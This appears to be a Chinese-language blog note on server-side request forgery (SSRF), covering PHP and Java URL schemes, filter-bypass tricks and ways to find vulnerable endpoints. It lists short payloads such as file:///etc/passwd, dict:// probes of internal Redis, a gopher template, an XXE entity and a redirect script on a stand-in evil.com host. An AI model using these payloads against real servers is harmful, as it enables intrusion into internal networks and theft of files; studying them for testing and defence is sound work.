+++
date = '2026-02-15'
draft = false
title = 'SSRF'

+++

### 伪协议

##### PHP

`http/s://  `常用于探测存活主机和开放端口,配合burp

```
https://example.com/title?title=http://127.0.0.1:6379
```

`file:// ` 读取文件内容

```
file:///etc/passwd
```

`dict://  `字典服务协议，可以通过这个协议执行一些指令.但是`dict`很难完成复杂的认证，他每次发送的请求都是新建立的连接

```
dict://127.0.0.1:6379/info
```

`gopher:// ` gopher协议可以伪造任何基于TCP的应用层协议报文（java不支持）

```
gopher://<host>:<port>/_<payload>

_ : 占位符。gopher协议在传输中会吃掉路径后的第一个字符
<payload> : 经过URL编码的原始tcp数据流
```

##### JAVA

`file://` 协议	与 PHP 类似

可以读取本地文件：`file:///etc/passwd`。

`netdoc://` 协议	它允许你访问并提取 `jar` 包中的内容。

- Payload: `netdoc:///etc/passwd`

`jar://` 协议	它允许你访问并提取 `jar` 包中的内容。

- 语法： `jar:{url}!/{entry}`
- 用法： `jar:http://evil.com/test.jar!/com/test/Main.class`
- 利用点：
  1. 让服务器去下载远程恶意 jar 包。
  2. 读取本地 classpath 下的配置文件。
  3. 结合某些反序列化漏洞，控制类加载过程。

### 绕过

**IP地址**

```
进制转换： 浏览器和许多网络库支持非十进制的 IP。

八进制： 0177.0.0.1
十六进制： 0x7f.0x0.0x0.0x1
十进制整数（最隐蔽）： 将 IP 换算成一个超大数字。127.0.0.1 ----> 2130706433

特殊省略写法：

127.0.0.1 可以写成 127.1 或 127.0.1。
0.0.0.0 在 Linux 下通常也会指向本地。

IPv6 绕过：
使用 [::1] 代表 127.0.0.1。
使用 IPv6 格式的内网地址。
```

**利用DNS**

如果后端校验了域名解析后的IP，但是校验逻辑存在疏忽依然可以利用

1. 域名映射

   利用一些指向`127.0.0.1`的公网域名

   ```
   localtest.me
   customer-127-0-0-1.nimbus.no
   127.0.0.1.nip.io
   ```

2. DNS 重绑定

   原理： 控制一个dns服务器，设置极短的TTL ，第一次解析： 校验代码询问DNS，返回一个合法的外网IP，校验通过。 第二次解析：

   实际发起请求的代码再次询问DNS，由于TTL已经过期进行重新请求，这次返回`127.0.0.1`

3. URL解析差异

   不同的编程语言或者库对url的解析规则不同

   ```
   @符号绕过：`http://www.google.com@127.0.0.1`
   有些解析器认为访问的是 `google.com`。
   有些（如 `curl`）则认为 `@` 前面是用户名密码，实际请求的是 `127.0.0.1`。
   
   斜杠与反斜杠： http://expected.com\@127.0.0.1
   
   # 锚点绕过： http://127.0.0.1#www.google.com
   ```

4. 利用重定向

   如果后端只检查初始输入的 URL 协议和域名，但不检查后续的跳转。

   1. 你在自己的服务器 `evil.com` 上放一个脚本：

   ```php
   <?php header("Location: dict://127.0.0.1:6379"); ?>
   ```

   2. 输入 URL：`http://evil.com/redirect.php`

   3. 服务器访问你的脚本，收到 302 跳转，于是顺着去请求了内网的 Redis。

5. java的ssrf一般跟xxe有关

   用户上传 XML -> Java XML 解析器未禁用外部实体 -> 攻击者定义一个外部实体指向内网地址 -> 解析器去请求该地址。

   ```
   <!DOCTYPE test [
     <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/config">
   ]>
   <user>&xxe;</user>
   ```

   

### 漏洞的挖掘

1. 图片,文章收藏功能： 此处的图片，文章收藏中的文章就类似于分析功能中获取URL地址中的title以及文本的内容作为显示

   例如：title是文章的地址，收藏后访问地址变成

   ```
   https://example.com/title?title=http://title.com/askdf123
   ```

2. google语法关键字：

   ```
   share	
   wap
   url	
   link
   src
   source
   target
   u
   display
   sourceURl
   imageURL
   domain
   ```

3. 代码审计（php）

   php产⽣ssrf的三个函数

   ```
   curl_exec():
   fsockopen():
   file_get_contents:
   ```

   这三个函数有⼀个共同点就是，都可以向⼀个⽹址或者站点发起⼀个请求
